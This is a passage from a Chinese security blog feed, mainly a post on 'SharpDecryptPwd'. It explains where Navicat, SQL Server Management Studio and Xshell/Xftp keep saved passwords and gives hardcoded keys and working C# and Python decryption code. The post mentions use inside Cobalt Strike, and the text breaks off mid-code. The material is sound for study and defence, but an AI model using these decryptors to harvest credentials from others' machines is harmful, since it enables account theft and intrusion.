href="https://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/" target="_blank" rel="noopener">https://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/</a><br><a href="https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/" target="_blank" rel="noopener">https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过 &lt;code&gt;CreateRemoteThread&lt;/code&gt; API 进行代码与 DLL 注入。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>SharpDecryptPwd</title>
    <link href="https://rcoil.me/2019/09/SharpDecryptPwd/"/>
    <id>https://rcoil.me/2019/09/SharpDecryptPwd/</id>
    <published>2019-09-01T06:37:56.000Z</published>
    <updated>2019-10-12T09:23:57.766Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在 <code>Windows</code> 系统下保存密码，无非就只存在于两个位置：<strong><em>注册表</em></strong>、<strong><em>文件</em></strong>。所以下文主要也是从注册表项、session文件中获取相关加密后的密码字段。且文章中所涉及的知识点，出处全在文末来源参考中，本文仅仅是个人的理解及整合。</p><p>主要对以下几个程序进行解析</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、Navicat PremiumSoft</span><br><span class="line">2、SQL<span class="built_in"> Server </span>Management Studio</span><br><span class="line">3、Xmanager --&gt; Xshell,Xftp</span><br><span class="line">4、TeamView</span><br><span class="line">5、FileZille</span><br><span class="line">6、Foxmail</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><p><strong>PS:</strong> 可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">Process Monitor </a> 监测进程的操作。</p><h2 id="0x01-Navicat-PremiumSoft"><a href="#0x01-Navicat-PremiumSoft" class="headerlink" title="0x01 Navicat PremiumSoft"></a>0x01 Navicat PremiumSoft</h2><p><code>Navicat</code> 的 session 信息是保存在注册表中的。以 <code>MySql</code> 为例</p><p><img src="/image/SharpDecryptPwd/blog_2019-08-23_16-34-53.png" alt=""></p><center> Navicat 中的 MySQL 配置（注册表路径）</center><p>上图注册表中，保存着我们需要的<strong><em>Host</em></strong>、<strong><em>UserName</em></strong>、<strong><em>PassWord</em></strong>等字段。以下是数据库类型对应注册表路径表</p><table><tr><th width="20%" bgcolor="#eea236">数据库类型</th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">注册表路径</th></tr><tr><td> MySQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td> MariaDB </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td> MongoDB </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td> Microsoft SQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td> Oracle </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td> PostgreSQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td> SQLite </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></table><h3 id="1-1-如何加密"><a href="#1-1-如何加密" class="headerlink" title="1.1 如何加密"></a>1.1 如何加密</h3><p>​        Navicat 使用 <code>Blowfish算法（河豚密码）</code>加密密码字符串。以下是 Navicat 所做的事情：</p><ul><li><p><strong><em>生成密钥</em></strong><br>  1、Navicat使用SHA-1算法生成160位密钥；<br>  2、对 <code>3DC5CA39</code> 字符串取其 <code>SHA-1摘要</code>，长度为8个字节，这字符串是 <code>Blowfish算法</code>中使用的密钥；<br>  3、确切的值是：</p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line">     <span class="number">0x42</span>, <span class="number">0xCE</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0xA5</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x4A</span>, <span class="number">0xEA</span>, <span class="number">0x93</span>, <span class="number">0x94</span>,</span><br><span class="line">     <span class="number">0x79</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x91</span>, <span class="number">0x87</span>, <span class="number">0x33</span>, <span class="number">0x40</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong><em>初始化向量（IV）</em></strong><br>  1、因为 <code>Blowfish算法</code>每次只能加密一个<strong>8字节长的块</strong>；<br>  2、所以开始时，Navicat 用 <code>0xFF</code> 填充一个<strong>8字节长的块</strong>，然后利用上面提到的 Key 进行 Blowfish 加密，得到 8字节长的初始向量（IV）；<br>  3、确切的值是：</p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] IV = &#123;</span><br><span class="line"><span class="number">0xD9</span>, <span class="number">0xC7</span>, <span class="number">0xC3</span>, <span class="number">0xC8</span>, <span class="number">0x87</span>, <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0xBD</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong><em>加密 rawPass 字符串</em></strong><br>  1、<strong>rawPass</strong> 字符串是ASCII字符串，且不考虑 “NULL” 终止符。<br>  2、 Navicat 使用管道来加密 <strong>rawPass</strong> 字符串。管道如下所示：<br>  <img src="/image/SharpDecryptPwd/EncryptionPipeline.png" alt=""></p><pre><code>&lt;center&gt; Blowfish 加密&lt;/center&gt;</code></pre><p>  <strong>注意</strong>：每个明文块都是一个8字节长的块。只有当最后一个明文块不是8字节长时，才能执行上图中显示的最后一步。</p></li></ul><h3 id="1-2-加密过程（C-）"><a href="#1-2-加密过程（C-）" class="headerlink" title="1.2 加密过程（C#）"></a>1.2 加密过程（C#）</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">string</span> <span class="title">EncryptString</span>(<span class="params"><span class="keyword">string</span> plaintext</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">byte</span>[] plaintext_bytes = Encoding.UTF8.GetBytes(plaintext);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] CV = Enumerable.Repeat&lt;<span class="keyword">byte</span>&gt;(<span class="number">0xFF</span>, Blowfish.BlockSize).ToArray();</span><br><span class="line">blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span> ret = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">int</span> blocks_len = plaintext_bytes.Length / Blowfish.BlockSize;</span><br><span class="line"><span class="keyword">int</span> left_len = plaintext_bytes.Length % Blowfish.BlockSize;</span><br><span class="line"><span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; blocks_len; ++i) &#123;</span><br><span class="line">Array.Copy(plaintext_bytes, Blowfish.BlockSize * i, temp, <span class="number">0</span>, Blowfish.BlockSize);</span><br><span class="line">XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">blowfishCipher.Encrypt(temp, Blowfish.Endian.Big);</span><br><span class="line">XorBytes(CV, temp, Blowfish.BlockSize);</span><br><span class="line"></span><br><span class="line">ret += ByteArrayToString(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (left_len != <span class="number">0</span>) &#123;</span><br><span class="line">blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line">XorBytes(CV,</span><br><span class="line"> plaintext_bytes.Skip(blocks_len * Blowfish.BlockSize).Take(left_len).ToArray(),</span><br><span class="line"> left_len);</span><br><span class="line">ret += ByteArrayToString(CV.Take(left_len).ToArray());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-解密过程"><a href="#1-3-解密过程" class="headerlink" title="1.3 解密过程"></a>1.3 解密过程</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">string</span> <span class="title">DecryptString</span>(<span class="params"><span class="keyword">string</span> ciphertext</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] ciphertext_bytes = StringToByteArray(ciphertext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] CV = Enumerable.Repeat&lt;<span class="keyword">byte</span>&gt;(<span class="number">0xFF</span>, Blowfish.BlockSize).ToArray();</span><br><span class="line">    blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] ret = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> blocks_len = ciphertext_bytes.Length / Blowfish.BlockSize;</span><br><span class="line">    <span class="keyword">int</span> left_len = ciphertext_bytes.Length % Blowfish.BlockSize;</span><br><span class="line">    <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">    <span class="keyword">byte</span>[] temp2 = <span class="keyword">new</span> <span class="keyword">byte</span>[Blowfish.BlockSize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; blocks_len; ++i) &#123;</span><br><span class="line">        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * i, temp, <span class="number">0</span>, Blowfish.BlockSize);</span><br><span class="line">        Array.Copy(temp, temp2, Blowfish.BlockSize);</span><br><span class="line">        blowfishCipher.Decrypt(temp, Blowfish.Endian.Big);</span><br><span class="line">        XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">        ret = ret.Concat(temp).ToArray();</span><br><span class="line">        XorBytes(CV, temp2, Blowfish.BlockSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left_len != <span class="number">0</span>) &#123;</span><br><span class="line">        Array.Clear(temp, <span class="number">0</span>, temp.Length);</span><br><span class="line">        Array.Copy(ciphertext_bytes, Blowfish.BlockSize * blocks_len, temp, <span class="number">0</span>, left_len);</span><br><span class="line">        blowfishCipher.Encrypt(CV, Blowfish.Endian.Big);</span><br><span class="line">        XorBytes(temp, CV, Blowfish.BlockSize);</span><br><span class="line">        ret = ret.Concat(temp.Take(left_len).ToArray()).ToArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Encoding.UTF8.GetString(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong></p><p><img src="/image/SharpDecryptPwd/blog_2019-08-27_12-48-37.png" alt=""></p><center> Navicat PremiumSoft 解密结果</center><h2 id="0x02-SSMS"><a href="#0x02-SSMS" class="headerlink" title="0x02 SSMS"></a>0x02 SSMS</h2><p>以 <code>session</code> 文件名及位置来划分，SSMS 可以分为 3 个大版本。（保存的文件都是标准的.net二进制序列化文件）</p><table><tr><th width="20%" bgcolor="#eea236">Version </th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">Session File Path</th></tr><tr><td> SSMS 2005 </td><td> %appdata%\Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat</td></tr><tr><td> SSMS 2008 </td><td> %appdata%\Microsoft\Microsoft SQL Server\100\Tools\Shell\SqlStudio.bin</td></tr><tr><td> SSMS Other </td><td> %appdata%\Microsoft\SQL Server Management Studio\xxxx\SqlStudio.bin</td></tr></table><p>这章节，所要表达的内容在 <a href="http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html" target="_blank" rel="noopener">SQL Server Management Studio密码导出工具</a> 当中已经分析得很详细了，故不多写。</p><p>​    <strong><em>PS：</em></strong>因为要加载私有程序集，故此程序无法在 <code>Cobalt Strike</code> 中使用，原因未知。</p><p><img src="/image/SharpDecryptPwd/blog_2019-08-23_15-51-03.png" alt=""></p><center> SharpSSMSPwd 解密结果</center><h2 id="0x03-Xmanager"><a href="#0x03-Xmanager" class="headerlink" title="0x03 Xmanager"></a>0x03 Xmanager</h2><p>有人问 session 文件里保存的密码是以什么方式保存的，被盗了后果是否很严重？<br>官方给出了下面的答案</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-What <span class="keyword">is</span> the obfuscation algorithm?</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> <span class="keyword">not</span> obfuscating password. Xshell <span class="keyword">uses</span> RC4 <span class="keyword">with</span> SHA256.</span><br></pre></td></tr></table></figure><p>当然，这是 5.1 版本之后所使用的。</p><p>如今的 <code>Xmanager</code> 大致可分为 2 个大版本。版本名及产生的 <code>session</code> 文件位置如下：</p><table><tr><th width="20%" bgcolor="#eea236">产品 </th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">会话文件位置</th></tr><tr><td> XShell 5 </td><td> %userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td> XFtp 5 </td><td> %userprofile%\Documents\NetSarang\Xftp\Sessions</td></tr><tr><td> XShell 6 </td><td> %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td> XFtp 6 </td><td> %userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions</td></tr></table><p>以下以 <code>XShell 6</code> 为例</p><p><img src="/image/SharpDecryptPwd/blog_2019-08-22_09-27-08.png" alt=""></p><p><img src="/image/SharpDecryptPwd/blog_2019-08-22_09-28-25.png" alt=""></p><h3 id="3-1-如何加密"><a href="#3-1-如何加密" class="headerlink" title="3.1 如何加密"></a>3.1 如何加密</h3><p>版本的不同，其加密方式也不一样。以下为默认设置下的加密行为。</p><ul><li><p><strong>版本 &lt; 5.1</strong></p><p><code>Xshell</code> 采用以字符串<code>!X@s#h$e%l^l&amp;</code> 的 MD5 值作为作为 <code>RC4 加密算法</code>中的密钥，以下是加密实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#MD5 = ba2d9b7e9cca73d152b26772662df55e</span></span><br><span class="line">cipher = ARC4.new(md5(<span class="string">b'!X@s#h$e%l^l&amp;'</span>).digest())</span><br><span class="line">print(b64encode(cipher.encrypt(<span class="string">b'RcoIl'</span>)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># +amcdP4=</span></span><br></pre></td></tr></table></figure><p><code>Xftp</code> 同理，以 <code>!X@s#c$e%l^l&amp;</code> 的 MD5 值作为密钥，与 Xshell 所使用的字符串仅一个字符之分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#MD5 = 306e9835de9291d227bb28b2f72dca33</span></span><br><span class="line">cipher = ARC4.new(md5(<span class="string">b'!X@s#c$e%l^l&amp;'</span>).digest())</span><br><span class="line">print(b64encode(cipher.encrypt(<span class="string">b'RcoIl'</span>)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># SvmUuQg=</span></span><br></pre></td></tr></table></figure></li><li><p><strong>版本 = 5.1 or 5.2</strong></p><p><code>Xshell</code> 和 <code>Xftp</code> 都使用 <code>SHA-256 摘要算法</code>生成密钥，作为 <code>RC4 加密</code>中使用的密钥。</p><p>以当前<code>用户账户的 SID</code> 作为 SHA-256 摘要，长度为 32 个字节的数组。SID 可通过 <code>whoami /user</code> 进行获取，如下所示：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\RcoIl&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名         SID</span><br><span class="line">============== =============================================</span><br><span class="line">rcoil-pc\rcoil S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3990929841</span><span class="number">-153547143</span><span class="number">-3340509336</span><span class="number">-1001</span></span><br><span class="line"></span><br><span class="line">SHA<span class="number">-256</span>: a6a7f87e9ab607e8ec70446569ff86919a55417c9259b8e866afb1403fb17a27</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0xA6</span>, <span class="number">0xA7</span>, <span class="number">0xF8</span>, <span class="number">0x7E</span>, <span class="number">0x9A</span>, <span class="number">0xB6</span>, <span class="number">0x07</span>, <span class="number">0xE8</span>, <span class="number">0xEC</span>, <span class="number">0x70</span>, <span class="number">0x44</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x69</span>, <span class="number">0xFF</span>, <span class="number">0x86</span>, <span class="number">0x91</span>, <span class="number">0x9A</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x7C</span>, <span class="number">0x92</span>, <span class="number">0x59</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0xAF</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0xB1</span>, <span class="number">0x7A</span>, <span class="number">0x27</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>版本 &gt; 5.2</strong></p><p>而 5.2 版本之后的 <code>Xshell</code> 与 <code>Xftp</code>，与之前只是多加了一个用户名。如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#user+sid</span></span><br><span class="line">RcoIlS<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3990929841</span><span class="number">-153547143</span><span class="number">-3340509336</span><span class="number">-1001</span></span><br><span class="line"></span><br><span class="line">SHA<span class="number">-256</span>: <span class="number">5e53</span>a13c5e98d02f8100ce62deb6e0dfec2a2361ba3c7fdd84dceb00554264bb</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x5E</span>, <span class="number">0x53</span>, <span class="number">0xA1</span>, <span class="number">0x3C</span>, <span class="number">0x5E</span>, <span class="number">0x98</span>, <span class="number">0xD0</span>, <span class="number">0x2F</span>, <span class="number">0x81</span>, <span class="number">0x00</span>, <span class="number">0xCE</span>, <span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xDE</span>, <span class="number">0xB6</span>, <span class="number">0xE0</span>, <span class="number">0xDF</span>, <span class="number">0xEC</span>, <span class="number">0x2A</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0xBA</span>, <span class="number">0x3C</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>,</span><br><span class="line"><span class="number">0x84</span>, <span class="number">0xDC</span>, <span class="number">0xEB</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x42</span>, <span class="number">0x64</span>, <span class="number">0xBB</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>设置了  Master Key 的情况下（5.1 版本之后）</p><p>如果设置了 主密码，则以主密码的 <code>SHA-256摘要</code>作为 <code>RC4 加密</code>中使用的密钥。例如：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Master Key:yingyingying</span><br><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x5E</span>, <span class="number">0xF9</span>, <span class="number">0xB6</span>, <span class="number">0x86</span>, <span class="number">0xF8</span>, <span class="number">0xE1</span>, <span class="number">0xCE</span>, <span class="number">0x51</span>, <span class="number">0xCB</span>, <span class="number">0xCD</span>, <span class="number">0xCB</span>, <span class="number">0x2F</span>,</span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x2B</span>, <span class="number">0x33</span>, <span class="number">0xB4</span>, <span class="number">0x3B</span>, <span class="number">0x17</span>, <span class="number">0xF3</span>, <span class="number">0xE6</span>, <span class="number">0xE9</span>, <span class="number">0x40</span>, <span class="number">0x23</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x68</span>, <span class="number">0xF0</span>, <span class="number">0xB7</span>, <span class="number">0xEC</span>, <span class="number">0xD6</span>, <span class="number">0x59</span>, <span class="number">0xF5</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-2-加密过程（C-）"><a href="#3-2-加密过程（C-）" class="headerlink" title="3.2 加密过程（C#）"></a>3.2 加密过程（C#）</h3><p>​        假设我们的密码是 <code>root</code>，则它的 <code>SHA-256 摘要</code>将作为附加加密数据。</p> <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x13</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x13</span>, <span class="number">0x7E</span>, <span class="number">0x16</span>, <span class="number">0x31</span>, <span class="number">0xBB</span>, <span class="number">0xA3</span>, <span class="number">0x01</span>, <span class="number">0xD5</span>,</span><br><span class="line"><span class="number">0xAC</span>, <span class="number">0xAB</span>, <span class="number">0x6E</span>, <span class="number">0x7B</span>, <span class="number">0xB7</span>, <span class="number">0xAA</span>, <span class="number">0x74</span>, <span class="number">0xCE</span>, <span class="number">0x11</span>, <span class="number">0x85</span>, <span class="number">0xD4</span>, <span class="number">0x56</span>,</span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x5E</span>, <span class="number">0xF5</span>, <span class="number">0x1D</span>, <span class="number">0x73</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0xB2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p><strong><em>Python 版本</em></strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD5, SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span></span><br><span class="line">rawPass = <span class="string">"root"</span></span><br><span class="line">cipher = ARC4.new(SHA256.new(UserSid).digest())</span><br><span class="line">checksum = SHA256.new(rawPass).digest()</span><br><span class="line">ciphertext = cipher.encrypt(rawPass)</span><br><span class="line"><span class="keyword">print</span> b64encode(ciphertext + checksum).decode()</span><br><span class="line"></span><br><span class="line">==》 klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-3-解密过程（C-）"><a href="#3-3-解密过程（C-）" class="headerlink" title="3.3 解密过程（C#）"></a>3.3 解密过程（C#）</h3><ul><li><p><strong><em>Python 版本</em></strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD5, SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span></span><br><span class="line">rawPass = <span class="string">"klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"</span></span><br><span class="line">data = b64decode(rawPass)</span><br><span class="line">Cipher = ARC4.new(SHA256.new((UserSid).encode()).digest())</span><br><span class="line">ciphertext, checksum = data[:-SHA256.digest_size], data[-SHA256.digest_size:]</span><br><span class="line">plaintext = Cipher.decrypt(ciphertext)</span><br><span class="line"><span class="keyword">print</span> plaintext.decode()</span><br></pre></td></tr></table></figure></li><li><p><strong><em>C# 版本</em></strong></p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> UserSid = <span class="string">"RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"</span>;</span><br><span class="line"><span class="keyword">string</span> rawPass = <span class="string">"klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"</span>;</span><br><span class="line"></span><br><span 